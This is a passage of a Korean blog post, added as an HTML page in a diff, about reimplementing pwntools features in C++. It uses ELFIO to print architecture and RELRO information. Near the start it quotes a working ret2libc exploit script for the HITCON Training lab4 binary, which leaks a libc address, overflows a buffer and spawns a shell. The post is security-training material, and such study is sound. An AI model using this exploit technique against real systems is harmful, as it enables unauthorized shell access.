@@ -1,0 +1,1362 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.21.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Pwntoolscpp 3 - Security Warehouse</title>
+<meta name="description" content="LAB4">
+
+
+  <meta name="author" content="lucid7">
+  
+  <meta property="article:author" content="lucid7">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Security Warehouse">
+<meta property="og:title" content="Pwntoolscpp 3">
+<meta property="og:url" content="https://lucid78.github.io/pwntoolscpp-3/">
+
+
+  <meta property="og:description" content="LAB4">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-01-21T00:00:00+09:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://lucid78.github.io/pwntoolscpp-3/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "lucid7",
+      "url": "https://lucid78.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Security Warehouse Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Security Warehouse
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="https://mmistakes.github.io/minimal-mistakes/docs/quick-start-guide/">Quick-Start Guide</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">lucid7</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Well, I still have music.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Korea</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Pwntoolscpp 3">
+    <meta itemprop="description" content="LAB4">
+    <meta itemprop="datePublished" content="2021-01-21T00:00:00+09:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Pwntoolscpp 3
+</h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          13 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        
+<h2 id="lab4"><strong>LAB4</strong></h2>
+
+<p>이제 가장 기본적인 기능은 어느정도 완성되었고, lab3에서도 동작하는 것을 확인했으니 이번에는 lab4를 공략해보자.
+<br />
+아래는 <a href="https://bachs.tistory.com/entry/HITCON-Training-lab4-return-to-library">https://bachs.tistory.com/entry/HITCON-Training-lab4-return-to-library</a> 에서 발췌한 lab4를 공략하는 exploit이다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+ 
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./ret2lib'</span><span class="p">)</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2lib'</span><span class="p">)</span>
+ 
+<span class="c1">#found address of puts got
+</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"found address of puts got : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]))</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
+ 
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>
+ 
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> 
+ 
+<span class="n">sys_offset</span>   <span class="o">=</span> <span class="mh">0x24d40</span>
+<span class="n">binsh_offset</span> <span class="o">=</span> <span class="mh">0xfd548</span>
+ 
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">sys_offset</span>
+<span class="n">binsh_addr</span>  <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">+</span> <span class="n">binsh_offset</span>
+ 
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"address of puts : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"address of system : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"address of /bin/sh string : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>
+ 
+<span class="n">payload</span>  <span class="o">=</span> <span class="s">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"a"</span><span class="o">*</span><span class="mi">60</span> <span class="c1">#dummy 60bytes
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"aaaa"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
+ 
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">출처</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">bachs</span><span class="p">.</span><span class="n">tistory</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">entry</span><span class="o">/</span><span class="n">HITCON</span><span class="o">-</span><span class="n">Training</span><span class="o">-</span><span class="n">lab4</span><span class="o">-</span><span class="k">return</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">library</span> <span class="p">[</span><span class="n">Bach</span><span class="err">`</span><span class="n">s</span> <span class="n">Blog</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>위의 exploit을 보면 ELF라는 class가 추가되었다.</p>
+
+<p>ELF는 got라는 함수를 호출하고 있는데, elf 포맷에서 got에 위치한 function의 address를 가지고 오는 기능을 가지고 있다. 이 기능을 완성하기 위해서는 ELF를 Parsing 해야 하는데, 이미 구현된 훌륭한 라이브러리들이 많으므로 기존의 것을 이용하기로 결정했다.
+<br />
+github를 검색해보면 c++로 제작된 ELF Parser가 굉장히 많이 있는데, 나는 그 중에서 elfio를 선택했다. <a href="https://github.com/serge1/ELFIO" target="_blank">ELFIO</a></p>
+
+<p>elfio는 header-only 프로그램이며 어떤 의존성도 없기 때문에, elfio 하나로 모든 기능을 다 수행할 수 있다는 장점이 있다. 또한 example들 중의 하나인 elfio_dump.hpp에 필요로 하는 대부분의 기능이 구현되어 있기 때문에 최소한의 작업으로 원하는 결과를 이끌어 낼 수 있다.</p>
+
+<p>elfio를 ptcpp 디렉토리 내에 clone한 후 ELFIO 디렉토리 내의 elfio 디렉토리만 상위 디렉토리로 옮기고 ELFIO 디렉토리는 삭제한다. 그리고 ELF 클래스를 추가하고 main.cpp에 아래 두 개의 헤더를 추가한다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "elfio/elfio.hpp"
+#include &lt;elfio/elfio_dump.hpp&gt;
+</span></code></pre></div></div>
+
+<p><br />
+ELF 클래스는 PROCESS 클래스처럼 실행할 프로그램 경로를 변수로 전달받는데, 아래와 같이 Arch, RELRO, Stack, NX, PIE 정보가 기본으로 출력된다.
+<br />
+<img src="/assets/images/bachs.png" alt="full" /></p>
+
+<p>출처: <a href="https://bachs.tistory.com/entry/HITCON-Training-lab4-return-to-library">https://bachs.tistory.com/entry/HITCON-Training-lab4-return-to-library</a></p>
+
+<h2 id="arch"><strong>ARCH</strong></h2>
+
+<p>먼저 Arch를 출력하는 기능을 만들어보자.
+<br />
+위의 화면에서 Arch는 machine type, architecture, endian의 3가지 정보를 출력한다. 이 정보를 ELF Format에서 알아내기 위해 실행파일을 로드해야 하는데 ELFIO를 아래와 같이 사용할 수 있다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ELFIO</span><span class="o">::</span><span class="n">elfio</span> <span class="n">reader</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">reader</span><span class="p">.</span><span class="n">load</span><span class="p">(</span><span class="n">path</span><span class="p">))</span>
+<span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Can't find or process ELF file "</span> <span class="o">&lt;&lt;</span> <span class="n">path</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><br />
+machine type은 ELFIO가 제공하는 함수 중 하나인 get_machine() 함수를 사용하면 된다.</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reader</span><span class="p">.</span><span class="n">get_machine</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p><br />
+다만 이 함수가 돌려주는 값은 unsigned short이기 때문에, 적절한 문자열로 매칭시켜 출력해야 한다. 따라서 매칭되는 문자열로 변경시켜 줄 데이터가 필요하며 이를 map으로 구현하였다. 아래의 정보는 elfio_dump.hpp에 정의되어 있는 정보를 사용하였다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">unordered_map</span><span class="o">&lt;</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf64_Half</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">machines</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="p">{</span> <span class="n">EM_NONE</span><span class="p">,</span> <span class="s">"No machine"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="n">EM_M32</span><span class="p">,</span> <span class="s">"AT&amp;T WE 32100"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="n">EM_SPARC</span><span class="p">,</span> <span class="s">"SUN SPARC"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="n">EM_386</span><span class="p">,</span> <span class="s">"Intel 80386"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="n">EM_68K</span><span class="p">,</span> <span class="s">"Motorola m68k family"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="n">EM_88K</span><span class="p">,</span> <span class="s">"Motorola m88k family"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="n">EM_486</span><span class="p">,</span> <span class="s">"Intel 80486// Reserved for future use"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="n">EM_860</span><span class="p">,</span> <span class="s">"Intel 80860"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="n">EM_MIPS</span><span class="p">,</span> <span class="s">"MIPS R3000 (officially, big-endian only)"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="n">EM_S370</span><span class="p">,</span> <span class="s">"IBM System/370"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="n">EM_MIPS_RS3_LE</span><span class="p">,</span> <span class="s">"MIPS R3000 little-endian (Oct 4 1999 Draft) Deprecated"</span> <span class="p">},</span>
+    <span class="p">...</span>
+    <span class="p">{</span> <span class="n">EM_CUDA</span><span class="p">,</span> <span class="s">"NVIDIA CUDA architecture "</span> <span class="p">}};</span>
+</code></pre></div></div>
+<p>위에서 key에 해당하는 값들은 모두 elf_type.hpp에 정의되어 있는 값이다.
+<br />
+이제 위에서 구현한 map과 더불어 get_machine() 함수를 특정 문자열과 매칭시켜 아래와 같이 출력할 수 있다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">machines</span><span class="p">[</span><span class="n">reader</span><span class="p">.</span><span class="n">get_machine</span><span class="p">()]</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><br />
+architecture 정보 역시 EFLIO의 get_class() 함수를 사용하여 쉽게 알아낼 수 있다. 이 함수는 반환 값으로 elf_type.hpp에 정의된 값인 ELFCLASS32 또는 ELFCLASS64를 반환하는데, ELFCLASS32일 경우 32비트, 그 반대의 경우는 64비트이다. 따라서 아래와 같이 사용할 수 있다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">reader</span><span class="p">.</span><span class="n">get_class</span><span class="p">()</span> <span class="o">==</span> <span class="n">ELFCLASS32</span> <span class="o">?</span> <span class="s">"32"</span> <span class="o">:</span> <span class="s">"64"</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><br />
+마지막으로 endian 역시 ELFIO의 get_encoding() 함수를 호출하여 반환값으로 판별 가능한데, 이 함수는 아래와 같이 3가지 종류의 값을 반환한다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">ELFDATANONE:</span> <span class="n">none</span><span class="p">,</span>
+<span class="n">ELFDATA2LSB</span><span class="o">:</span> <span class="n">little</span><span class="p">,</span>
+<span class="n">ELFDATA2MSB</span><span class="o">:</span> <span class="n">Big</span>
+</code></pre></div></div>
+
+<p><br />
+역시 위 값들을 적절한 문자열로 매칭하는 map을 만들어서 아래와 같이 사용할 수 있다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">unordered_map</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">endians</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="p">{</span> <span class="n">ELFDATANONE</span><span class="p">,</span> <span class="s">"None"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="n">ELFDATA2LSB</span><span class="p">,</span> <span class="s">"Little endian"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="n">ELFDATA2MSB</span><span class="p">,</span> <span class="s">"Big endian"</span> <span class="p">}</span>
+<span class="p">};</span>
+<span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">endians</span><span class="p">[</span><span class="n">reader</span><span class="p">.</span><span class="n">get_encoding</span><span class="p">()]</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><br />
+아래는 위의 내용들을 종합하여 ELFIO로 실행파일 로딩 시 Arch 정보까지만 출력하는 코드 및 실행 결과이다. 지면 관계상 machines의 일부분은 생략하였고, 완전한 코드는 아래 첨부해 놓았다.</p>
+
+<p><a href="LAB4%20533e97ab692847c2abc2fb31005fb8f8/main.cpp">main.cpp</a>
+<br /></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;iostream&gt;
+#include &lt;mutex&gt;
+</span>
+<span class="cp">#include &lt;boost/process.hpp&gt;
+#include &lt;boost/asio.hpp&gt;
+#include &lt;boost/thread.hpp&gt;
+#include &lt;boost/chrono.hpp&gt;
+#include &lt;boost/endian/buffers.hpp&gt;
+#include &lt;boost/format.hpp&gt;
+</span>
+<span class="cp">#include "elfio/elfio.hpp"
+#include &lt;elfio/elfio_dump.hpp&gt;
+#include &lt;elfio/elf_types.hpp&gt;
+</span>
+<span class="k">class</span> <span class="nc">ELF</span>
+<span class="p">{</span>
+<span class="nl">private:</span>
+    <span class="n">ELFIO</span><span class="o">::</span><span class="n">elfio</span> <span class="n">reader</span><span class="p">;</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">m_path</span><span class="p">;</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">unordered_map</span><span class="o">&lt;</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf64_Half</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">machines</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{</span> <span class="n">EM_NONE</span><span class="p">,</span> <span class="s">"No machine"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_M32</span><span class="p">,</span> <span class="s">"AT&amp;T WE 32100"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SPARC</span><span class="p">,</span> <span class="s">"SUN SPARC"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_386</span><span class="p">,</span> <span class="s">"Intel 80386"</span> <span class="p">},</span>
+        <span class="p">...</span>
+        <span class="p">{</span> <span class="n">EM_CUDA</span><span class="p">,</span> <span class="s">"NVIDIA CUDA architecture "</span> <span class="p">}</span>
+    <span class="p">};</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">unordered_map</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">endians</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{</span> <span class="n">ELFDATANONE</span><span class="p">,</span> <span class="s">"None"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">ELFDATA2LSB</span><span class="p">,</span> <span class="s">"Little endian"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">ELFDATA2MSB</span><span class="p">,</span> <span class="s">"Big endian"</span> <span class="p">}</span>
+    <span class="p">};</span>
+
+<span class="nl">public:</span>
+    <span class="n">ELF</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="n">m_path</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">reader</span><span class="p">.</span><span class="n">load</span><span class="p">(</span><span class="n">path</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Can't find or process ELF file "</span> <span class="o">&lt;&lt;</span> <span class="n">path</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] '"</span> <span class="o">&lt;&lt;</span> <span class="n">m_path</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"    Arch:     "</span>
+        <span class="o">&lt;&lt;</span> <span class="n">machines</span><span class="p">[</span><span class="n">reader</span><span class="p">.</span><span class="n">get_machine</span><span class="p">()]</span> 
+        <span class="o">&lt;&lt;</span> <span class="s">"-"</span>
+        <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">reader</span><span class="p">.</span><span class="n">get_class</span><span class="p">()</span> <span class="o">==</span> <span class="n">ELFCLASS32</span> <span class="o">?</span> <span class="s">"32"</span> <span class="o">:</span> <span class="s">"64"</span><span class="p">)</span>
+        <span class="o">&lt;&lt;</span> <span class="s">"-"</span>
+        <span class="o">&lt;&lt;</span> <span class="n">endians</span><span class="p">[</span><span class="n">reader</span><span class="p">.</span><span class="n">get_encoding</span><span class="p">()]</span>
+        <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">try</span>
+    <span class="p">{</span>
+        <span class="n">ELF</span> <span class="n">e</span><span class="p">{</span><span class="s">"/tmp/hitcon/LAB/lab4/ret2lib"</span><span class="p">};</span>
+    <span class="p">}</span>
+    <span class="k">catch</span> <span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">exception</span><span class="o">&amp;</span> <span class="n">e</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Exception: "</span> <span class="o">&lt;&lt;</span> <span class="n">__FUNCTION__</span> <span class="o">&lt;&lt;</span> <span class="s">" "</span> <span class="o">&lt;&lt;</span> <span class="n">e</span><span class="p">.</span><span class="n">what</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/arch.png" alt="full" /></p>
+
+<p><br /></p>
+
+<h2 id="relro"><strong>RELRO</strong></h2>
+
+<p>pwntools나 checksec에서 RELRO를 판단하는 로직이 어떤 것인지에 대해 다음 블로그를 참고하였다. <a href="https://chp747.tistory.com/215">https://chp747.tistory.com/215</a></p>
+
+<p>요약하면 segment header 중 PT_GNU_RELRO type을 가지는 segment가 있고, dynamic section에 DT_BIND_NOW flag가 있을 경우 Full Relro, DT_BIND_NOW가 없을 경우에는 Partial Relro, 둘 다 없을 경우에는 No Relro이다.</p>
+
+<p>일단 EFLIO로 segment header의 type을 파싱하는 방법은 아래와 같다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reader</span><span class="p">.</span><span class="n">segments</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">ELFIO</span><span class="o">::</span><span class="n">segment</span><span class="o">*</span> <span class="n">seg</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">segments</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">to_string</span><span class="p">(</span><span class="n">seg</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">()))</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p><br />
+따라서 PT_GNU_RELRO type인지 비교하는 코드만 아래와 같이 추가할 수 있다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">relro</span><span class="p">;</span>
+<span class="k">for</span><span class="p">(</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf_Half</span> <span class="n">i</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reader</span><span class="p">.</span><span class="n">segments</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">ELFIO</span><span class="o">::</span><span class="n">segment</span><span class="o">*</span> <span class="n">seg</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">segments</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">PT_GNU_RELRO</span> <span class="o">==</span> <span class="n">seg</span><span class="o">-&gt;</span><span class="n">get_type</span><span class="p">())</span>
+    <span class="p">{</span>
+        <span class="n">relro</span> <span class="o">=</span> <span class="s">"Partial RELRO"</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><br />
+문제는 EFLIO의 type 정보에는 PT_GNU_RELRO 값이 없다. 따라서 해당 값을 수동으로 추가해 주어야만 한다.
+<br />
